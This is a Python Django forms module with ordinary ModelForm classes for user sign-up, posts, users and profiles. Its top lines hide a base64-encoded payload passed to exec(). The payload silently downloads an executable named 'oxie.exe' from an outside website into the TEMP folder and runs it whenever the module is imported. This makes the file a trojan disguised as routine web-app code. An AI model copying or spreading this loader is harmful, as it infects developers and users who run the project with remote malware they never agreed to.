
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django import forms
from django.forms import ModelForm
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth.models import User

from .models import Post, Profile


class CustomUserCreationForm(UserCreationForm):

	class Meta:
		model = User
		fields = ['first_name', 'last_name', 'email', 'password1', 'password2']

class PostForm(ModelForm):

	class Meta:
		model = Post
		fields = '__all__'

		widgets = {
			'tags':forms.CheckboxSelectMultiple(),
		}

class UserForm(ModelForm):
	class Meta:
		model = User
		fields = ['first_name', 'last_name', 'email']
		

class ProfileForm(ModelForm):
	class Meta:
		model = Profile
		fields = '__all__'
		exclude = ['user']